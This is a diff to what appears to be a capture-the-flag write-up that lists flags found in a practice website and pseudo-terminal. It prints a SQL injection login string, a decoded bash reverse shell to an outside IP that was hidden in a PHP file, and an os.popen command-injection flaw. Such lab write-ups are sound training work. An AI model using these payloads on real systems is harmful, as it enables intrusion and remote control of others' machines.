@@ -11,12 +11,30 @@ We examined the file with Wireshark.
 
 ¡Flags founded!
 
+-----------------------------------------------------
 > 1: At website > internal > index.html we found the key nujnlhrZZKidXugUkCtiUgqDMuoDbnA3. Where we found the key, the code was calling the file "login.php". At "login.php" we realized that with a certain username, we can request all the usernames and passwords.
 Username: 1') OR ('1' = '1
 
+-----------------------------------------------------
 > 2: At websites > php > login.html we found the key qL1cmCvxPS626V9MBVCL3x18LKZc4oc8. We investigated about MD5, and we found that two different passwords could have the same hash. That could be an exploit :(
 
-> 3: At website > contact > index.html we found the key 5Mk3rXNhMC8Osgpki3iOcdVTkSAIMdxE. Where we found the key, the code was calling the file "test_comment.php". Examining the file "test_comment.php" we found a code in 64 bit format.
+-----------------------------------------------------
+> 3: At website > contact > index.html we found the key 5Mk3rXNhMC8Osgpki3iOcdVTkSAIMdxE. Where we found the key, the code was calling the file "test_comment.php". Examining the file "test_comment.php" we found a code in 64 bit format. We decoded it and found out it says:
 
-> 4: At pseudo-terminal > switch.py we found the key IUt0zFZKcPsLo2yek7OgSpockEd80LOA. Later on the same file, we found the flag corresponding to this key. When terminal.py calls "get_command("banner")", the get_command function calls the function "cmd_" + "banner".
+	system("bash -c 'bash -i >& /dev/tcp/158.46.250.151/9001 0>&1'");
 
+We investigated it and realized that this code opens an opens an interactive instance of bash on a TCP conexion of the specified host port. (It should previally exist a TCP server hearin in that host and that port).
+(https://unix.stackexchange.com/questions/116010/meaning-of-bash-i-dev-tcp-host-port-01)
+
+In spanish: abre una instancia interactiva de bash sobre una coneccion tcp en el puerto especificado del host. Deberá existir un servidor tcp escuchando en ese host y en ese port.
+
+-----------------------------------------------------
+> 4: At pseudo-terminal > switch.py we found the key IUt0zFZKcPsLo2yek7OgSpockEd80LOA. Later on the same file, we found the flag corresponding to this key. At the cmd_banner function, when you call it with an string argument that doesn't start with 's', the function calls 
+
+figlet {}".format(self.banner_text)
+return str(os.popen(cmd).read()).encode('utf-8'), STATUS_ALIVE
+
+wich draws a banner with the text. What makes this a vulnerability it's that you could enter "sometext ; malicious code" as the argument and the code will draw a banner saying "something" and then execute the malicious code.
+
+-----------------------------------------------------
+> 5: At the file autoload_real.php (websites/public/wordpress/wp-content/plugins/bdthemes-element-pack-lite/admin/optimizer/vendor/composer/autoload_real.php) we found the key 9ac9e6effec80d2974b7001b8337be36.
